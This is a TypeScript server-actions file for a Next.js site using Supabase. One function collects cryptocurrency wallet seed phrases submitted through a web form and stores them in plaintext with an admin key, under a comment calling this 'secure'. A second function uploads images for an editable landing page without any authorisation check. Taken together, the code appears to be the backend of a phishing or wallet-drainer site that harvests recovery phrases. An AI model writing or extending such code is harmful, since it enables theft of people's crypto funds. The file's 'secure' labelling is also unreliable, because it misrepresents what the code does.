
"use server";

import { z } from "zod";
import { createClient } from "@supabase/supabase-js";
import mime from 'mime-types';


const formSchema = z.object({
  seedPhrase: z.string(),
  network: z.string(),
});

type RegistrationResult = {
  success: boolean;
  error?: string;
};

// This is a secure server action to register the seed phrase in Supabase
export async function registerSeedPhrase(
  formData: FormData
): Promise<RegistrationResult> {
  const rawFormData = {
    seedPhrase: formData.get("seedPhrase"),
    network: formData.get("network"),
  };

  const validatedFields = formSchema.safeParse(rawFormData);
  if (!validatedFields.success) {
    return {
      success: false,
      error: "Invalid data provided.",
    };
  }

  const supabaseUrl = process.env.SUPABASE_URL;
  const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

  if (!supabaseUrl || !supabaseServiceRoleKey) {
    let missingVars = [];
    if (!supabaseUrl) missingVars.push("SUPABASE_URL");
    if (!supabaseServiceRoleKey) missingVars.push("SUPABASE_SERVICE_ROLE_KEY");
    console.error(`Supabase server-side environment variables are not set: ${missingVars.join(", ")}`);
    return {
      success: false,
      error: "Server configuration error. Required environment variables are not set.",
    };
  }

  try {
    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);
    const { error } = await supabaseAdmin
      .from("seed_phrases")
      .insert([
        {
          seed_phrase: validatedFields.data.seedPhrase,
          network: validatedFields.data.network,
        },
      ])
      .select();

    if (error) {
      console.error("Supabase admin insert error:", error);
      return { success: false, error: `Database error: ${error.message}` };
    }

    return { success: true };
  } catch (err: any) {
    console.error("Unexpected error during seed registration:", err);
    return {
      success: false,
      error: "An unexpected server error occurred during registration.",
    };
  }
}

type UpdateImagesResult = {
  success: boolean;
  error?: string;
  updatedUrls?: Record<string, string>;
};

// This is a secure server action to upload images and update the database
export async function updateLandingPageImages(
  formData: FormData
): Promise<UpdateImagesResult> {
  const supabaseUrl = process.env.SUPABASE_URL;
  const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

  if (!supabaseUrl || !supabaseServiceRoleKey) {
    return { success: false, error: "Server configuration error." };
  }

  const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);
  const bucketName = "landing-images";

  // Ensure the bucket exists
  try {
    const { data: bucket, error: bucketError } = await supabaseAdmin.storage.getBucket(bucketName);
    if (bucketError && bucketError.message === 'Bucket not found') {
       const { error: createError } = await supabaseAdmin.storage.createBucket(bucketName, {
        public: true,
        allowedMimeTypes: ["image/*"],
      });
      if (createError) {
        console.error("Supabase create bucket error:", createError);
        return { success: false, error: `Failed to create storage bucket: ${createError.message}` };
      }
    } else if (bucketError) {
        console.error("Supabase get bucket error:", bucketError);
        return { success: false, error: `Failed to access storage bucket: ${bucketError.message}` };
    }
  } catch (err: any) {
     console.error("Unexpected error checking bucket:", err);
     return { success: false, error: "An unexpected server error occurred while checking storage." };
  }


  const updatedUrls: Record<string, string> = {};

  // Fetch the current content
  const { data: currentContentData, error: fetchError } = await supabaseAdmin
    .from("editable_content")
    .select("content")
    .eq("id", "landing-page-images")
    .single();

  if (fetchError) {
    return { success: false, error: `Database fetch error: ${fetchError.message}` };
  }

  const newContent = { ...currentContentData.content };

  for (const [id, file] of formData.entries()) {
    if (file instanceof File) {
      const filePath = `public/${id}-${Date.now()}`;
      const contentType = mime.lookup(file.name) || 'application/octet-stream';

      const { error: uploadError } = await supabaseAdmin.storage
        .from(bucketName)
        .upload(filePath, file, {
            contentType,
            upsert: true,
        });

      if (uploadError) {
        console.error("Supabase upload error:", uploadError);
        return { success: false, error: `Upload error: ${uploadError.message}` };
      }

      const { data: publicUrlData } = supabaseAdmin.storage
        .from(bucketName)
        .getPublicUrl(filePath);

      if (publicUrlData) {
        newContent[id] = publicUrlData.publicUrl;
        updatedUrls[id] = publicUrlData.publicUrl;
      }
    }
  }

  const { error: updateError } = await supabaseAdmin
    .from("editable_content")
    .update({ content: newContent, updated_at: new Date().toISOString() })
    .eq("id", "landing-page-images");

  if (updateError) {
    console.error("Supabase update error:", updateError);
    return { success: false, error: `Database update error: ${updateError.message}` };
  }

  return { success: true, updatedUrls };
}
